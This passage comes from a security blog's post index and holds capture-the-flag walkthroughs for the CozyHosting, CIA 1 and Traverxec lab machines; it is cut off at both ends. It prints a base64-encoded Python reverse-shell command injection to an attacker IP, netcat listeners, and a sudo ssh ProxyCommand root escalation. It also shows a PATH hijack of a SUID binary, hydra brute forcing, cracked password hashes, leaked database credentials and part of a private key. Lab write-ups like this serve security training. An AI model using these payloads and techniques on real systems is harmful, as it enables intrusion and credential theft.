http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css200 GET 285l 745w 12706c http://cozyhosting.htb/[####################] - 5s 850/850 0s found:30 errors:0 [####################] - 4s 565/565 127/s http://cozyhosting.htb/ â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/CozyHosting]â””â”€$```{: .nolineno}And I got these any files so lets dig in â†’I got some cookies values from this site `/actuator/sessions` â†’![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%204.png)Now lets access the admin page and change our cookies value â†’Since the value of cookies are changing every min or so , that why load the new values and copy it and paste it into the cookies section then load `/admin` site again â¤µï¸ ![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%205.png)![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%206.png)Now after refresing the page I got this â¤µï¸ ![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%207.png)Now The username and hostname indicates the value for SSH login credentials so lets bypass this with some command injection and since it detects spaces so I used the simple reverese shell code which will be base64 decoded and executed as bash here it is â†’![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%208.png)Now lets insert our payload here â†’![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%209.png)```bash# payload â¤µï¸;echo${IFS}cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjYxIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw|base64${IFS}-d|bash${IFS};## base64 encoded value â¤µï¸ â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/CozyHosting]â””â”€$ echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjYxIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw' |base64 -d python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.61\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'```{: .nolineno}Now when I executed it I got the response as reverse shell on nc lisener â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/CozyHosting]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.61] from (UNKNOWN) [10.10.11.230] 39534app@cozyhosting:/app$ lslscloudhosting-0.0.1.jarapp@cozyhosting:/app$```{: .nolineno}I downloaded this file and extracted that file and I got this credentials â¤µï¸ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/CozyHosting/BOOT-INF/classes]â””â”€$ cat application.properties server.address=127.0.0.1server.servlet.session.timeout=5mmanagement.endpoints.web.exposure.include=health,beans,env,sessions,mappingsmanagement.endpoint.sessions.enabled = truespring.datasource.driver-class-name=org.postgresql.Driverspring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialectspring.jpa.hibernate.ddl-auto=nonespring.jpa.database=POSTGRESQLspring.datasource.platform=postgresspring.datasource.url=jdbc:postgresql://localhost:5432/cozyhostingspring.datasource.username=postgresspring.datasource.password=Vg&nvzAQ7XxR```{: .nolineno}Lets access the postgresql now â†’```bashapp@cozyhosting:/app$ psql -U postgres -W -h localhost -d cozyhostingPassword: psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)Type \"help\" for help.cozyhosting=# helpYou are using psql, the command-line interface to PostgreSQL.Type: \\copyright for distribution terms \\h for help with SQL commands \\? for help with psql commands \\g or terminate with semicolon to execute query \\q to quitcozyhosting=#cozyhosting-# \\lList of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -------------+----------+----------+-------------+-------------+----------------------- cozyhosting | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres(4 rows)cozyhosting-# \\dtList of relations Schema | Name | Type | Owner --------+-------+-------+---------- public | hosts | table | postgres public | users | table | postgres(2 rows)cozyhosting-# \\d usersTable \"public.users\" Column | Type | Collation | Nullable | Default ----------+------------------------+-----------+----------+--------- name | character varying(50) | | not null | password | character varying(100) | | not null | role | role | | | Indexes: \"users_pkey\" PRIMARY KEY, btree (name)Referenced by: TABLE \"hosts\" CONSTRAINT \"hosts_username_fkey\" FOREIGN KEY (username) REFERENCES users(name)cozyhosting=# select * from users;name | password | role -----------+--------------------------------------------------------------+------- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin(2 rows)```{: .nolineno}Now with hashcat Tool I cracked the password of admin that is â¤µï¸ ```bash$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited```{: .nolineno}Now its time for SSH login â†’## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/CozyHosting]â””â”€$ ssh josh@cozyhosting.htb The authenticity of host 'cozyhosting.htb (10.10.11.230)' cant be established.ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'cozyhosting.htb' (ED25519) to the list of known hosts.josh@cozyhosting.htb is password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Aug 29 09:03:32 AM UTC 2023 System load: 0.39794921875 Usage of /: 53.9% of 5.42GB Memory usage: 12% Swap usage: 0% Processes: 264 Users logged in: 0 IPv4 address for eth0: 10.129.229.88 IPv6 address for eth0: dead:beef::250:56ff:feb9:f0deExpanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Tue Aug 29 09:03:34 2023 from 10.10.14.41josh@cozyhosting:~$```{: .nolineno}Now lets see how this user can lead me to root user â†’```bashjosh@cozyhosting:~$ sudo -l[sudo] password for josh: Matching Defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser josh may run the following commands on localhost: (root) /usr/bin/ssh *josh@cozyhosting:~$```{: .nolineno}Now with GTFObin help I can exploit this one â†’![Untitled](/Vulnhub-Files/img/CozyHosting/Untitled%2010.png)```bashjosh@cozyhosting:~$ sudo -u root ssh -o ProxyCommand=';bash 0&2' xroot@cozyhosting:/home/josh# whoamirootroot@cozyhosting:/home/josh# iduid=0(root) gid=0(root) groups=0(root)root@cozyhosting:/home/josh# cd /rootroot@cozyhosting:~# ls -altotal 40drwx------ 5 root root 4096 Aug 14 13:37 .drwxr-xr-x 19 root root 4096 Aug 14 14:11 ..lrwxrwxrwx 1 root root 9 May 18 15:00 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwx------ 2 root root 4096 Aug 8 10:10 .cache-rw------- 1 root root 56 Aug 14 13:37 .lesshstdrwxr-xr-x 3 root root 4096 May 11 19:21 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profilelrwxrwxrwx 1 root root 9 May 18 15:00 .psql_history -> /dev/null-rw-r----- 1 root root 33 Sep 10 08:39 root.txtdrwx------ 2 root root 4096 May 9 18:49 .ssh-rw-r--r-- 1 root root 39 Aug 8 10:19 .vimrcroot@cozyhosting:~# cat root.txtc53f157a8912c99b2e83fb9e54578d1droot@cozyhosting:~# cat /home/josh/user.txtecc16918dd79dc8a3957ff9fa3ef914eroot@cozyhosting:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:fd:e8 brd ff:ff:ff:ff:ff:ff altname enp3s0 altname ens160 inet 10.10.11.230/23 brd 10.10.11.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:fde8/64 scope global dynamic mngtmpaddr valid_lft 86392sec preferred_lft 14392sec inet6 fe80::250:56ff:feb9:fde8/64 scope link valid_lft forever preferred_lft foreverroot@cozyhosting:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "CIA 1", "url": "/posts/CIA/", "categories": "VulnHub", "tags": "Password Bruteforce, Public Exploit, SUIDs, mysql", "date": "2023-09-15 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/CIA/Untitled%201.png)```bashIP : 10.0.2.60```{: .nolineno}```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nma...", "content": "## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/CIA/Untitled%201.png)```bashIP : 10.0.2.60```{: .nolineno}```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.64Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-14 16:06 ISTNmap scan report for 10.0.2.64Host is up (0.0040s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0)| ssh-hostkey: | 3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)| 256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)|_ 256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)80/tcp open http Apache httpd 2.4.48 ((Debian))|_http-title: qdPM | Login3306/tcp open mysql MySQL 8.0.26| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate| Not valid before: 2021-09-25T10:47:29|_Not valid after: 2031-09-23T10:47:29| mysql-info: | Protocol: 10| Version: 8.0.26| Thread ID: 46| Capabilities flags: 65535| Some Capabilities: FoundRows, Support41Auth, DontAllowDatabaseTableColumn, LongPassword, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, ODBCClient, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments| Status: Autocommit| Salt: .W~'T\\x19\\x10;%%\\x1BYDe\\x1FF\\x7Fgb\\x05|_ Auth Plugin Name: caching_sha2_password|_ssl-date: TLS randomness does not represent time33060/tcp open mysqlx?| fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\"| HY000| LDAPBindReq: | *Parse error unserializing protobuf message\"| HY000| oracle-tns: | Invalid message-frame.\"|_ HY0001 service unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸Lets see the port 80 webpage â†’![Untitled](/Vulnhub-Files/img/CIA/Untitled%202.png)Now lets find an exploit related to `qdPM 9.2` â¤µï¸ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ searchsploit qdPM 9.2 ---------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------- ---------------------------------qdPM 9.2 - Cross-site Request Forgery (CSRF) | php/webapps/50854.txtqdPM 9.2 - Password Exposure (Unauthenticated) | php/webapps/50176.txt---------------------------------------------------- ---------------------------------Shellcodes: No Results```{: .nolineno}Now lets use the `password Exposure` Exploit â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ cat 50176.txt # Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)# Date: 03/08/2021# Exploit Author: Leon Trappett (thepcn3rd)# Vendor Homepage: https://qdpm.net/# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download# Version: 9.2# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4The password and connection string for the database are stored in a yml file. To access the yml file you can go to http:///core/config/databases.yml file and download.```{: .nolineno}Now I followed the exploit and got that file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ cat databases.yml all: doctrine: class: sfDoctrineDatabase param: dsn: 'mysql:dbname=qdpm;host=localhost' profiler: false username: qdpmadmin password: \"\" attributes: quote_identifier: true```{: .nolineno}Now Lets login into the database and get some credentials â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ mysql -h 10.0.2.64 -u qdpmadmin -pEnter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MySQL connection id is 164Server version: 8.0.26 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]> show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || qdpm || staff || sys |+--------------------+6 rows in set (0.105 sec)MySQL [(none)]>```{: .nolineno}I short in whole database I got the data from `Staff` database that is â†’```bashEncoded Password : Password : Role\t\t\t\t\t\t: User : Departmentc3VSSkFkR3dMcDhkeTNyRg== : suRJAdGwLp8dy3rF : Cyber Security Specialist : Smith : AgentN1p3VjRxdGc0MmNtVVhHWA== : 7ZwV4qtg42cmUXGX : Computer Engineer\t\t\t: Lucas : EnginnerWDdNUWtQM1cyOWZld0hkQw== : X7MQkP3W29fewHdC : Intelligence Specialist\t: Travis : AgentREpjZVZ5OThXMjhZN3dMZw== : DJceVy98W28Y7wLg : Cyber Security Analyst \t: Dexter : AgentY3FObkJXQ0J5UzJEdUpTeQ== : cqNnBWCByS2DuJSy : Genetic Engineer\t\t\t: Meyer : Enginner```{: .nolineno}Now I decoded those passwords and saved them in pass.txt file and the user in users.txt file and tried to brute-force for SSH login and I got the hit.>You have to make the username in smaller character .{: .prompt-tip }```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ hydra -L user.txt -P pass.txt ssh://10.0.2.64Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-14 16:49:04[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task[DATA] attacking ssh://10.0.2.64:22/[22][ssh] host: 10.0.2.64 login: dexter password: 7ZwV4qtg42cmUXGX[22][ssh] host: 10.0.2.64 login: travis password: DJceVy98W28Y7wLg1 of 1 target successfully completed, 2 valid passwords foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-14 16:49:11```{: .nolineno}Now its SSH time !!## SSH Login â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/CIA1]â””â”€$ ssh dexter@10.0.2.64 The authenticity of host '10.0.2.64 (10.0.2.64)' cant be established.ED25519 key fingerprint is SHA256:xCJPzSxRekyYT6eXmyzAXdY7uAlP5b7vQp+B5XqYsfE.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.64' (ED25519) to the list of known hosts.dexter@10.0.2.64s password: Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Sep 25 08:43:19 2021 from 192.168.1.3dexter@debian:~$ ls -altotal 32drwxrwx--- 3 dexter dexter 4096 Sep 25 2021 .drwxr-xr-x 4 root root 4096 Sep 25 2021 ..-rwxrwx--- 1 dexter dexter 6 Sep 25 2021 .bash_history-rwxrwx--- 1 dexter dexter 220 Aug 4 2021 .bash_logout-rwxrwx--- 1 dexter dexter 3526 Aug 4 2021 .bashrcdrwxrwx--- 3 dexter dexter 4096 Sep 25 2021 .local-rwxrwx--- 1 dexter dexter 198 Sep 25 2021 note.txt-rwxrwx--- 1 dexter dexter 807 Aug 4 2021 .profiledexter@debian:~$ cat note.txtIt seems to me that there is a weakness while accessing the system.As far as I know, the contents of executable files are partially viewable.I need to find out if there is a vulnerability or not.dexter@debian:~$```{: .nolineno}I changed the users as travis with above got credentails and thought that I would get some privileges but no , Then I checked the SUIDs here â†’```bashtravis@debian:/home$ find / -perm -u=s -type f 2>/dev/null/opt/get_access/usr/bin/chfn/usr/bin/umount/usr/bin/gpasswd/usr/bin/sudo/usr/bin/passwd/usr/bin/newgrp/usr/bin/su/usr/bin/mount/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helpertravis@debian:/home$```{: .nolineno}Lets see the `/opt/get_access` file â†’```bashtravis@debian:/home$ strings /opt/get_access/lib64/ld-linux-x86-64.so.2setuidsocketputssystem__cxa_finalizesetgid__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu/UH[]A\\A]A^A_cat /root/system.infoCould not create socket to access to the system.All services are disabled. Accessing to the system is allowed only within working hours.;*3$\"GCC: (Debian 10.2.1-6) 10.2.1 20210110crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0...```{: .nolineno}Since it is executing `cat` command So,Now I know I have to make cat as executable and then change the path and then run the `/opt/get_access` file and I will get the root shell â†’```bashtravis@debian:/opt$ cd /tmptravis@debian:/tmp$ echo \"/bin/bash -p\" > cattravis@debian:/tmp$ echo $PATH/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gamestravis@debian:/tmp$ chmod +x cattravis@debian:/tmp$ export PATH=/tmp:$PATHtravis@debian:/tmp$ /opt/got_accessbash: /opt/got_access: No such file or directorytravis@debian:/tmp$ ./opt/got_accessbash: ./opt/got_access: No such file or directorytravis@debian:/tmp$ /opt/get_accessroot@debian:/tmp# whoamirootroot@debian:/tmp# iduid=0(root) gid=0(root) groups=0(root),33(www-data),1002(travis)root@debian:/tmp# cd /rootroot@debian:/root# export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/gamesroot@debian:/root# ls -altotal 40drwx------ 3 root root 4096 Sep 25 2021 .drwxr-xr-x 18 root root 4096 Sep 25 2021 ..-rw------- 1 root root 20 Sep 25 2021 .bash_history-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrcdrwxr-xr-x 3 root root 4096 Sep 25 2021 .local-rw------- 1 root root 647 Sep 25 2021 .mysql_history-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r--r-- 1 root root 45 Sep 25 2021 root.txt-rw-r--r-- 1 root root 260 Sep 25 2021 system.info-rw-r--r-- 1 root root 217 Sep 25 2021 .wget-hstsroot@debian:/root# cat root.txtICA{Next_Generation_Self_Renewable_Genetics}root@debian:/root# cat system.info ############################ ######## ICA ####### ### ACCESS TO THE SYSTEM ### ############################ Server Information: - Firewall:\tAIwall v9.5.2 - OS:\tDebian 11 \"bullseye\" - Network:\tLocal Secure Network 2 (LSN2) v 2.4.1root@debian:/root# ifconfigbash: ifconfig: command not foundroot@debian:/root# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: enp0s3: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:0d:61:d5 brd ff:ff:ff:ff:ff:ff inet 10.0.2.64/24 brd 10.0.2.255 scope global dynamic enp0s3 valid_lft 504sec preferred_lft 504sec inet6 fe80::a00:27ff:fe0d:61d5/64 scope link valid_lft forever preferred_lft foreverroot@debian:/root#```{: .nolineno}---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Traverxec", "url": "/posts/Traverxec/", "categories": "HackTheBox", "tags": "Password Cracking, PrivEsc, Public Exploit", "date": "2023-09-01 00:00:00 +0530", "snippet": "### Lets see the IP address â†’```bashIP : 10.10.10.165```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Traverxec]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10...", "content": "### Lets see the IP address â†’```bashIP : 10.10.10.165```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Traverxec]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.10.165[sudo] password for kali: Starting Nmap 7.94 ( https:/nmap.org ) at 2023-07-21 12:26 ISTNmap scan report for 10.10.10.165Host is up (0.17s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open http nostromo 1.9.6Service Info: ; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Traverxec/Untitled.png)Lets search an exploit related to `nostromo 1.9.6` â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Traverxec]â””â”€$ searchsploit nostromo 1.9.6]------------------------------------------------ --------------------------------- Exploit Title | Path]------------------------------------------------ ---------------------------------nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py]------------------------------------------------ ---------------------------------Shellcodes: No Results```{: .nolineno}Lets try it out now â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Traverxec]â””â”€$ python2 cve2019-16278.py 10.10.10.165 80 whoami _____-2019-16278 _____ _______ ______ _____\\ _____\\ \\_\\ | | | / / | | / /| || / / /|/ / /___/| / / /____/||\\ \\ \\ |/| |__ |___|/| | |____|/ \\ \\ \\ | | | | | _____ \\| \\| | | __/ __|\\ \\|\\ \\ |\\ /| |\\ \\ / | \\_____\\| | | \\_______/ | | \\____\\/ || | /____/| \\ | | / | | |____/| \\|_____| || \\|_____|/ \\|____| | | |____|/ |___|/HTTP/1.1 200 OKDate: Fri, 21 Jul 2023 07:09:46 GMTServer: nostromo 1.9.6Connection: closewww-data```{: .nolineno}Now lets try reverse shell command execution from it â†’![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Traverxec]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.213] from (UNKNOWN) [10.10.10.165] 51210whoamiwww-datawhich python/usr/bin/pythonpython -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@traverxec:/usr/bin$ id iduid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@traverxec:/usr/bin$```{: .nolineno}Found something interesting â†’```bashwww-data@traverxec:/var/nostromo/conf$ cat .htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/www-data@traverxec:/var/nostromo/conf$```{: .nolineno}Now with the help of hashcat I decoded the password of david â†’```bashhashes.txt = $1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/commands : hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt```{: .nolineno}![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%202.png)```bash$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me```{: .nolineno}But each time I use this password it says invalid â†’```bashwww-data@traverxec:/home$ su davidPassword: su: Authentication failurewww-data@traverxec:/home$```{: .nolineno}Lets find something else â†’Now while checking the `nostromo/conf/nhttpd.conf` â†’![Untitled](/Vulnhub-Files/img/Traverxec/Untitled%203.png)so since I am not allowed to enter into david so lets list file inside of david user using `public_www` â†’```bashwww-data@traverxec:/home/david$ ls -al public_www/total 16drwxr-xr-x 3 david david 4096 Oct 25 2019 .drwx--x--x 5 david david 4096 Oct 25 2019 ..-rw-r--r-- 1 david david 402 Oct 25 2019 index.htmldrwxr-xr-x 2 david david 4096 Oct 25 2019 protected-file-areawww-data@traverxec:/home/david$ ls -al public_www/protected-file-area/total 16drwxr-xr-x 2 david david 4096 Oct 25 2019 .drwxr-xr-x 3 david david 4096 Oct 25 2019 ..-rw-r--r-- 1 david david 45 Oct 25 2019 .htaccess-rw-r--r-- 1 david david 1915 Oct 25 2019 backup-ssh-identity-files.tgzwww-data@traverxec:/home/david$```{: .nolineno}Now lets see inside the `backup-ssh-identity-files.tgz` file â†’```bashwww-data@traverxec:/home/david$ tar -tvf public_www/protected-file-area/backup-sssh-identity-files.tgzdrwx------ david/david 0 2019-10-25 17:02 home/david/.ssh/-rw-r--r-- david/david 397 2019-10-25 17:02 home/david/.ssh/authorized_keys-rw------- david/david 1766 2019-10-25 17:02 home/david/.ssh/id_rsa-rw-r--r-- david/david 397 2019-10-25 17:02 home/david/.ssh/id_rsa.pubwww-data@traverxec:/home/david$```{: .nolineno}Now if I can extract data so extract at /tmp/Data location so for that I used this command â†’```bashtar zxvf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -C /tmp/Data```{: .nolineno}```bashwww-data@traverxec:/tmp/Data$ find .../home./home/david./home/david/.ssh./home/david/.ssh/authorized_keys./home/david/.ssh/id_rsa./home/david/.ssh/id_rsa.pubwww-data@traverxec:/tmp/Data$```{: .nolineno}Lets see the `id_rsa` file here â†’```bashwww-data@traverxec:/tmp/Data/home/david/.ssh$ cat id_rsa]-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4FseyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCGtuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3WKzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFURJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIcY1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hecdTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qOxwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54TfzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFAbzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2souDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8IAk/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfU